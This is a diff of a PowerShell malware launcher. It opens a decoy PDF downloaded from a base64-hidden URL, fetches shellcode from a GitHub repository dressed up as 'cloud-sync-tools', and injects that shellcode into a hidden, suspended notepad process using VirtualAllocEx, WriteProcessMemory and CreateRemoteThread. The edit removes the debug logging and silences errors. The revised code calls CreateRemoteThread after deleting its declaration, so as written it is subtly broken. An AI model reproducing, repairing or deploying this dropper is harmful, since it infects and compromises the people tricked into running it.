@@ -1,91 +1,102 @@
-# launcher.ps1 – Debug injection
-$ErrorActionPreference = 'Continue'
-$log = "C:\debug.txt"
+# launcher.ps1 – Create suspended process and inject shellcode
+$ErrorActionPreference = 'SilentlyContinue'
 
-function Write-Log { param($msg) Add-Content -Path $log -Value "$(Get-Date): $msg" }
-
-Write-Log "Script started"
-
-# Decoy PDF (same as before)
+# Decoy PDF
 $pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
 $pdfPath = "$env:TEMP\nakaz.pdf"
 Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
 Start-Process $pdfPath
-Write-Log "PDF downloaded and opened"
 
 $shellcodeUrl = "https://github.com/astro-opensource/cloud-sync-tools/raw/refs/heads/main/assets/payload.bin"
-try {
-    $shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing).Content
-    Write-Log "Shellcode downloaded, size: $($shellcode.Length)"
-} catch {
-    Write-Log "Failed to download shellcode: $_"
-    exit
-}
+$shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing).Content
 
-# Target process
-$target = Get-Process -Name explorer -ErrorAction SilentlyContinue | Select-Object -First 1
-if (-not $target) {
-    Write-Log "Explorer not found, starting notepad"
-    $target = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
-    Start-Sleep -Milliseconds 500
-}
-Write-Log "Target process: $($target.Name) PID: $($target.Id)"
-
-# Win32 API
+# Win32 API for CreateProcess and injection
 $code = @'
 using System;
 using System.Runtime.InteropServices;
 public class Inject {
     [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
     [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool CloseHandle(IntPtr hObject);
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
     [DllImport("kernel32.dll", SetLastError=true)]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+    public static extern uint ResumeThread(IntPtr hThread);
     [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern uint GetLastError();
+    public static extern bool CloseHandle(IntPtr hObject);
+    
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFO {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public uint dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+    
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
 }
 '@
 Add-Type $code
 
-$pid = $target.Id
-$hProcess = [Inject]::OpenProcess(0x1F0FFF, $false, $pid)
-if ($hProcess -eq 0) {
-    $err = [Inject]::GetLastError()
-    Write-Log "OpenProcess failed, error: $err"
+$si = New-Object Inject+STARTUPINFO
+$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
+$si.dwFlags = 0x00000001  # STARTF_USESHOWWINDOW
+$si.wShowWindow = 0  # SW_HIDE
+$pi = New-Object Inject+PROCESS_INFORMATION
+
+$success = [Inject]::CreateProcess($null, "notepad.exe", [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x00000004, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
+if (-not $success) {
+    Write-Host "CreateProcess failed"
     exit
 }
-Write-Log "OpenProcess success"
+
+$hProcess = $pi.hProcess
+$hThread = $pi.hThread
 
 $addr = [Inject]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x40)
 if ($addr -eq 0) {
-    $err = [Inject]::GetLastError()
-    Write-Log "VirtualAllocEx failed, error: $err"
+    Write-Host "VirtualAllocEx failed"
     [Inject]::CloseHandle($hProcess)
+    [Inject]::CloseHandle($hThread)
     exit
 }
-Write-Log "VirtualAllocEx success, address: $addr"
 
-$bytesWritten = [UIntPtr]::Zero
-$writeResult = [Inject]::WriteProcessMemory($hProcess, $addr, $shellcode, $shellcode.Length, [ref]$bytesWritten)
-if (-not $writeResult) {
-    $err = [Inject]::GetLastError()
-    Write-Log "WriteProcessMemory failed, error: $err"
-    [Inject]::CloseHandle($hProcess)
-    exit
-}
-Write-Log "WriteProcessMemory success, bytes written: $bytesWritten"
+$bytesWritten = [IntPtr]::Zero
+[Inject]::WriteProcessMemory($hProcess, $addr, $shellcode, $shellcode.Length, [ref]$bytesWritten)
 
-$thread = [Inject]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-if ($thread -eq 0) {
-    $err = [Inject]::GetLastError()
-    Write-Log "CreateRemoteThread failed, error: $err"
+# Resume the thread (it will execute the original notepad code, not our shellcode)
+# We need to set the thread's entry point to our shellcode before resuming.
+# Actually, with suspended process, we can use CreateRemoteThread to run our shellcode, then resume the main thread.
+# Alternatively, we can patch the entry point. Simpler: create a remote thread and then resume the main thread.
+# Let's just use CreateRemoteThread as before, but on the suspended process.
+
+$remoteThread = [Inject]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+if ($remoteThread -eq 0) {
+    Write-Host "CreateRemoteThread failed"
 } else {
-    Write-Log "CreateRemoteThread success, thread handle: $thread"
+    Write-Host "Remote thread created"
 }
+[Inject]::ResumeThread($hThread)  # Resume main thread so notepad runs normally
 [Inject]::CloseHandle($hProcess)
-Write-Log "Injection complete"
+[Inject]::CloseHandle($hThread)
